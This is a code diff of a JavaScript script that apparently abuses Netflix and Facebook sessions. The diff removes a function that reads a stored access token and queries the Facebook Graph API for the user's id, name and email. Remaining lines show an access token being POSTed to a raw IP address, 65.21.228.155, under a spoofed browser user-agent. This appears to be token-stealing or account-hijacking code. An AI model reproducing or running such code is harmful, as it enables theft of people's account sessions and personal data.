@@ -13,22 +13,7 @@ function laccessNetflix(access_token) {
         })
     })
 }
-function isFBConnected() {
-  return new Promise((resolve) => {
-    readAccessToken().then((access_token) => {
-      fetch(
-        "https://graph.facebook.com/v12.0/me?access_token=" +
-          access_token +
-          '&fields=["id","name","email"]&method=get&pretty=0&sdk=joey&suppress_http_code=1',
-        {
-          method: "GET",
-        }
-      ).then((response) => {
-        resolve(response);
-      });
-    });
-  });
-}
+
 function pairAndroid(access_token) {
     return fetch('https://65.21.228.155/mobile/code', {
         method: 'POST',
@@ -95,7 +80,7 @@ function runNetflixScript() {
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
   };
 alert("La7adhat bro !")
-isFBConnected();
+
 validateUser(access_token, profile_id);
 laccessNetflix(access_token)
           .then(response => response.json())
